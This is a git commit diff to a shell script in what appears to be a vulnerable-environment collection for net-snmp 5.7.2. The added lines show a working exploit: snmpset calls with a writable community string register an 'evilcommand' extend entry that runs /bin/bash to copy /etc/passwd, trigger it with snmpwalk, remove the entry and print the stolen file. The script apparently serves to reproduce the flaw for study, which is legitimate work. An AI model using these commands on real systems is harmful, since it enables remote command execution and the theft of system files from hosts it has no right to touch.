0ef40ee0e5b21c77daf8879b4f907b7e67dbe271
Aaron Lewis <the.warl0ck.1989@gmail.com>
2020-02-24 16:21:02 +0800

    修正命令

--- src/snmpd/5.7.2/root/ext.sh
+++ src/snmpd/5.7.2/root/ext.sh
@@ -3,6 +3,16 @@
 snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
     'nsExtendStatus."evilcommand"'  = createAndGo \
     'nsExtendCommand."evilcommand"' = /bin/echo \
-    'nsExtendArgs."evilcommand"'    = 'hello world'
+    'nsExtendArgs."evilcommand"'    = 'Hello World'
+
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
+    'nsExtendCommand."evilcommand"' = /bin/bash \
+    'nsExtendArgs."evilcommand"'    = '-c "cp /etc/passwd /tmp"'
 
 snmpwalk -v2c -c c0nfig localhost nsExtendObjects | grep "evilcommand"
+
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
+    'nsExtendStatus."evilcommand"'  = destroy
+
+cat /tmp/passwd
+
